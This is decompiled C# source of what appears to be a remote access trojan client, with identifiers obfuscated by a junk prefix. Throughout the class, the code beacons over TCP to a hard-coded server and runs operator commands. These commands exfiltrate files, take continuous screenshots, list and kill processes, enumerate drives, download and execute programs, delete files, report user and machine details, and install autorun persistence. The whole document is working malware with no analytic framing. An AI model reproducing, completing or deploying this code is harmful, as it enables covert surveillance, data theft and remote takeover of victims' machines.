using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace roigtbraorn;

public class MCAIDM
{
	private Dictionary<string, byte[]> roigtbraorntasks = new Dictionary<string, byte[]>();

	public DateTime roigtbraornrunTime;

	private int roigtbraornbytesRead = 0;

	public bool roigtbraornreqCnls = false;

	private int roigtbraornatmps = 0;

	public bool roigtbraornautCnls = false;

	public DateTime roigtbraornlTimeUtc;

	private THAIRE roigtbraornStateObj = new THAIRE();

	private MYAIINF roigtbraornUPC;

	private OCAIMD roigtbraornCMD;

	private int roigtbraornscrSize = 200;

	private ThreadStart roigtbraornfunStarter;

	public TcpClient roigtbraorntcpsck;

	public NetworkStream roigtbraornnetStream;

	private int roigtbraornbuffSize = 1024;

	private DRAIIVF roigtbraornHD = new DRAIIVF();

	public bool roigtbraornis_working = false;

	private bool roigtbraorniswitch = false;

	public int port_sn = 0;

	private bool roigtbraornthrRuning = false;

	private int roigtbraornthreadCnts = 0;

	private bool roigtbraornstr_writer = false;

	private bool roigtbraorncapScreen = false;

	private Thread roigtbraornfunThread;

	public void roigtbraorndoa_start()
	{
		COAINF.roigtbraornport = COAINF.ports[0];
		roigtbraornrunTime = DateTime.Now;
		roigtbraornUPC = new MYAIINF();
		roigtbraornCMD = new OCAIMD(this);
		roigtbraornHD.iserver = this;
		roigtbraornHD.roigtbraornmainPath = COAINF.roigtbraornget_mpath();
		TimerCallback callback = roigtbraornloaokup_cngx;
		Timer roigtbraorntimer = new Timer(callback, roigtbraornStateObj, 32110, 36110);
		roigtbraornStateObj.roigtbraorntimer = roigtbraorntimer;
	}

	public void roigtbraornsaaveFile(string filePath)
	{
		try
		{
			byte[] array = roigtbraornpuall_data();
			if (array != null)
			{
				File.WriteAllBytes(filePath, array);
			}
		}
		catch
		{
		}
	}

	public string roigtbraornfiale_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|roigtbraorn".Split(new char[1] { '|' })[0] : "<|roigtbraorn".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|roigtbraorn".Split(new char[1] { '|' })[0] : "<|roigtbraorn".Split(new char[1] { '|' })[0]);
			text = text + roigtbraorngeat_size(fileInfo.Length) + ((!ret) ? ">|roigtbraorn".Split(new char[1] { '|' })[0] : "<|roigtbraorn".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				roigtbraornpuash_data(null, "roigtbraorn-fialsz=|roigtbraorn".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void roigtbraorncheckLaastatime(DateTime mTimeUtc)
	{
		try
		{
			int num = Math.Abs(roigtbraornrunTime.Subtract(mTimeUtc).Minutes);
			if (num > 6)
			{
				roigtbraorntcpsck.Close();
				roigtbraornis_working = false;
			}
		}
		catch
		{
		}
	}

	private void roigtbraornloaokup_cngx(object sdogource)
	{
		try
		{
			if (!roigtbraornthrRuning)
			{
				roigtbraornthrRuning = true;
				roigtbraorncheckLaastatime(DateTime.Now);
				if (!roigtbraornis_working || !roigtbraorntcpsck.Connected)
				{
					roigtbraornis_working = roigtbraornIPSCX();
					if (roigtbraornis_working)
					{
						roigtbraornbuffSize = roigtbraorntcpsck.ReceiveBufferSize;
						roigtbraornseae_rexi();
					}
				}
			}
			else
			{
				roigtbraornthreadCnts++;
			}
			roigtbraornthrRuning = false;
		}
		catch
		{
			roigtbraornatmps++;
			roigtbraornthrRuning = false;
			roigtbraornthreadCnts = 0;
			roigtbraornstr_writer = false;
			roigtbraornis_working = false;
			roigtbraorniswitch = false;
		}
	}

	public void roigtbraornpoarts_switch()
	{
		try
		{
			port_sn++;
			COAINF.roigtbraornport = COAINF.ports[port_sn];
			if (port_sn >= COAINF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public void roigtbraornliast_processes()
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|roigtbraorn".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|roigtbraorn".Split(new char[1] { '|' })[0];
				text += "0>|roigtbraorn".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] byteArray = COAINF.getByteArray(text);
			roigtbraornpuash_data(byteArray, "roigtbraorn-praocl=proass|roigtbraorn".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private bool roigtbraornIPSCX()
	{
		try
		{
			COAINF.roigtbraorndefaultP = COAINF.getBytsString(COAINF.roigtbraornvpsips);
			roigtbraorntcpsck = new TcpClient();
			roigtbraorntcpsck.Connect(COAINF.roigtbraorndefaultP, COAINF.roigtbraornport);
			return true;
		}
		catch
		{
			roigtbraornpoarts_switch();
			return false;
		}
	}

	public bool roigtbraornseand_auto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				roigtbraornpuash_data(data, "roigtbraorn-afaile=" + fileinfo);
				return false;
			}
			roigtbraornpuash_data(null, "roigtbraorn-anafod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void roigtbraornloaad_app()
	{
		try
		{
			string executablePath = Application.get_ExecutablePath();
			Thread.Sleep(10);
			COAINF.roigtbraornset_run("ldcvr|roigtbraorn".Split(new char[1] { '|' })[0], executablePath);
		}
		catch
		{
		}
	}

	private void roigtbraornimaage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|roigtbraorn".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|roigtbraorn".Split(new char[1] { '|' })[0];
				text = text + roigtbraorngeat_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-thaumb=|roigtbraorn".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void roigtbraornisa_screen(string screenSize)
	{
		try
		{
			SCAIRNS sCAIRNS = new SCAIRNS();
			roigtbraornscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			while (roigtbraorncapScreen && roigtbraornis_working)
			{
				Bitmap val = sCAIRNS.roigtbraornscreen(roigtbraornscrSize);
				if (val != null)
				{
					MemoryStream memoryStream = new MemoryStream();
					((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
					roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-scaren=capareen|roigtbraorn".Split(new char[1] { '|' })[0]);
				}
			}
		}
		catch
		{
		}
	}

	private void roigtbraornusaer_info()
	{
		string text = roigtbraornUPC.roigtbraornlancard + "|" + roigtbraornUPC.roigtbraorncname + "|" + roigtbraornUPC.roigtbraornuname + "|" + roigtbraornUPC.roigtbraornuip + "|" + COAINF.roigtbraornOsname() + "|" + roigtbraornUPC.roigtbraornapver + "|".ToString();
		text += "| !roigtbraorn".Split(new char[1] { '!' })[0];
		text = text + "|" + roigtbraornUPC.roigtbraornclientNum;
		text = text + "|" + COAINF.roigtbraornget_mpath();
		byte[] byteArray = COAINF.getByteArray(text);
		roigtbraornpuash_data(byteArray, "roigtbraorn-inafo=usaer|roigtbraorn".Split(new char[1] { '|' })[0]);
	}

	private void roigtbraornscareenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			roigtbraornscrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void roigtbraornseae_scren(string screenSize)
	{
		try
		{
			SCAIRNS sCAIRNS = new SCAIRNS();
			roigtbraornscrSize = Convert.ToInt16(screenSize.Split(new char[1] { '>' })[0].Trim());
			Bitmap val = sCAIRNS.roigtbraornscreen(roigtbraornscrSize);
			if (val != null)
			{
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
				roigtbraornpuash_data(memoryStream.ToArray(), "roigtbraorn-saascr=capareen|roigtbraorn".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void roigtbraornpuash_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				roigtbraornpuash_data(File.ReadAllBytes(lfile), "roigtbraorn-fiale=|roigtbraorn".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void roigtbraornremaove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public string[] roigtbraorngeat_command()
	{
		try
		{
			byte[] array = new byte[5];
			roigtbraornbytesRead = roigtbraornnetStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= roigtbraornbytesRead)
			{
				int count = ((num3 > roigtbraornbuffSize) ? roigtbraornbuffSize : num3);
				roigtbraornbytesRead = roigtbraornnetStream.Read(array2, num2, count);
				num2 += roigtbraornbytesRead;
			}
			string bytsString = COAINF.getBytsString(array2);
			if (bytsString.Trim() == "")
			{
				return null;
			}
			return bytsString.Split(new char[1] { '=' });
		}
		catch
		{
			roigtbraornis_working = false;
			return null;
		}
	}

	private string roigtbraorngeat_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|roigtbraorn".Split(new char[1] { '|' })[0],
				"KB|roigtbraorn".Split(new char[1] { '|' })[0],
				"MB|roigtbraorn".Split(new char[1] { '|' })[0],
				"GB|roigtbraorn".Split(new char[1] { '|' })[0],
				"TB|roigtbraorn".Split(new char[1] { '|' })[0],
				"PB|roigtbraorn".Split(new char[1] { '|' })[0],
				"EB|roigtbraorn".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	public byte[] roigtbraornpuall_data()
	{
		try
		{
			roigtbraornrunTime = DateTime.Now;
			int num = 0;
			byte[] array = new byte[5];
			roigtbraornbytesRead = roigtbraornnetStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !roigtbraornreqCnls)
			{
				int count = ((num3 > roigtbraornbuffSize) ? roigtbraornbuffSize : num3);
				roigtbraornbytesRead = roigtbraornnetStream.Read(array2, num, count);
				num += roigtbraornbytesRead;
				num3 -= roigtbraornbytesRead;
				roigtbraornrunTime = DateTime.Now;
			}
			if (roigtbraornreqCnls)
			{
				roigtbraornnetStream.Flush();
				while (roigtbraornnetStream.DataAvailable && roigtbraornnetStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			roigtbraornis_working = false;
			return null;
		}
	}

	private void roigtbraornliastDrives()
	{
		string text = roigtbraornHD.roigtbraornloaokup_Drives();
		roigtbraornpuash_data(null, "roigtbraorn-diars=" + text);
	}

	public bool roigtbraornpuash_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			roigtbraornrunTime = DateTime.Now;
			if (roigtbraornstr_writer)
			{
				return false;
			}
			roigtbraornstr_writer = true;
			byte[] byteArray = COAINF.getByteArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(byteArray.Length);
			byte[] array2 = new byte[num2 + byteArray.Length + num];
			bytes.CopyTo(array2, 0);
			byteArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + byteArray.Length);
				data.CopyTo(array2, 10 + byteArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !roigtbraornreqCnls)
			{
				int num5 = ((num4 > roigtbraornbuffSize) ? roigtbraornbuffSize : num4);
				roigtbraornnetStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
				roigtbraornrunTime = DateTime.Now;
			}
			roigtbraornstr_writer = false;
			if (roigtbraornreqCnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			roigtbraornstr_writer = false;
			roigtbraornis_working = false;
			return false;
		}
	}

	private void roigtbraornseae_rexi()
	{
		if (!roigtbraorniswitch)
		{
			roigtbraorniswitch = true;
			roigtbraornnetStream = roigtbraornCMD.roigtbraornNS(roigtbraorntcpsck);
			roigtbraorncapScreen = false;
			while (roigtbraornis_working)
			{
				string[] switchType = roigtbraorngeat_command();
				if (switchType != null)
				{
					roigtbraornreqCnls = false;
					string text = switchType[0].ToLower();
					text = ((text.Split(new char[1] { '-' }).Length <= 1) ? ("roigtbraorn-" + text) : ("roigtbraorn-" + text.Split(new char[1] { '-' })[1]));
					switch (text)
					{
					case "roigtbraorn-praocl":
					case "roigtbraorn-procl":
						roigtbraornfunStarter = delegate
						{
							roigtbraornliast_processes();
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-enadpo":
					case "roigtbraorn-endpo":
						try
						{
							Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						}
						catch
						{
						}
						break;
					case "roigtbraorn-scarsz":
					case "roigtbraorn-scrsz":
						roigtbraornscareenSize(switchType[1]);
						break;
					case "roigtbraorn-csacreen":
					case "roigtbraorn-cscreen":
						roigtbraornseae_scren(switchType[1]);
						break;
					case "roigtbraorn-diars":
					case "roigtbraorn-dirs":
						roigtbraornfunThread = new Thread(roigtbraornliastDrives);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-staops":
					case "roigtbraorn-stops":
						roigtbraorncapScreen = false;
						break;
					case "roigtbraorn-scaren":
					case "roigtbraorn-scren":
						roigtbraorncapScreen = true;
						roigtbraornfunStarter = delegate
						{
							roigtbraornisa_screen(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-thaumb":
					case "roigtbraorn-thumb":
						roigtbraornimaage_info(switchType[1]);
						break;
					case "roigtbraorn-claping":
					case "roigtbraorn-clping":
						roigtbraornrunTime = DateTime.Now;
						break;
					case "roigtbraorn-puatsrt":
					case "roigtbraorn-putsrt":
						roigtbraornloaad_app();
						break;
					case "roigtbraorn-fialsz":
					case "roigtbraorn-filsz":
						roigtbraornfunStarter = delegate
						{
							roigtbraornfiale_info(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-ruapth":
					case "roigtbraorn-rupth":
						roigtbraornpuash_data(null, "roigtbraorn-apapth=|roigtbraorn".Split(new char[1] { '|' })[0] + COAINF.roigtbraornget_mpath());
						break;
					case "roigtbraorn-doawf":
					case "roigtbraorn-dowf":
						roigtbraornsaaveFile(switchType[1]);
						break;
					case "roigtbraorn-cnals":
					case "roigtbraorn-cnls":
						roigtbraornautCnls = true;
						roigtbraornreqCnls = true;
						roigtbraorncapScreen = false;
						break;
					case "roigtbraorn-udalt":
					case "roigtbraorn-udlt":
						roigtbraornCMD.roigtbraornremove_user();
						break;
					case "roigtbraorn-dealt":
					case "roigtbraorn-delt":
						roigtbraornfunStarter = delegate
						{
							roigtbraornremaove_file(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-afaile":
					case "roigtbraorn-afile":
						roigtbraornfunStarter = delegate
						{
							roigtbraornseand_auto(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-liastf":
					case "roigtbraorn-listf":
						roigtbraornfunStarter = delegate
						{
							roigtbraornHD.roigtbraornloaok_Files(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-fiale":
					case "roigtbraorn-file":
						roigtbraornfunStarter = delegate
						{
							roigtbraornpuash_file(switchType[1]);
						};
						roigtbraornfunThread = new Thread(roigtbraornfunStarter);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-inafo":
					case "roigtbraorn-info":
						roigtbraornfunThread = new Thread(roigtbraornusaer_info);
						roigtbraornfunThread.Start();
						break;
					case "roigtbraorn-ruanf":
					case "roigtbraorn-runf":
						Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "roigtbraorn-flaes":
					case "roigtbraorn-fles":
					{
						string files = roigtbraornHD.roigtbraornloaokup_Files(switchType[1]);
						if (files != "")
						{
							roigtbraornfunStarter = delegate
							{
								roigtbraornpuash_data(null, "roigtbraorn-flaes=|roigtbraorn".Split(new char[1] { '|' })[0] + files);
							};
							roigtbraornfunThread = new Thread(roigtbraornfunStarter);
							roigtbraornfunThread.Start();
						}
						break;
					}
					case "roigtbraorn-doawr":
					case "roigtbraorn-dowr":
						roigtbraornsaaveFile(switchType[1]);
						break;
					case "roigtbraorn-fladr":
					case "roigtbraorn-fldr":
					{
						string Folders = roigtbraornHD.roigtbraornchaeck_Folders(switchType[1]);
						if (Folders != "")
						{
							roigtbraornfunStarter = delegate
							{
								roigtbraornpuash_data(null, "roigtbraorn-fladr=|roigtbraorn".Split(new char[1] { '|' })[0] + Folders);
							};
							roigtbraornfunThread = new Thread(roigtbraornfunStarter);
							roigtbraornfunThread.Start();
						}
						break;
					}
					}
					continue;
				}
				roigtbraornis_working = false;
				break;
			}
			roigtbraornis_working = false;
			roigtbraorncapScreen = false;
		}
		roigtbraorniswitch = false;
	}
}
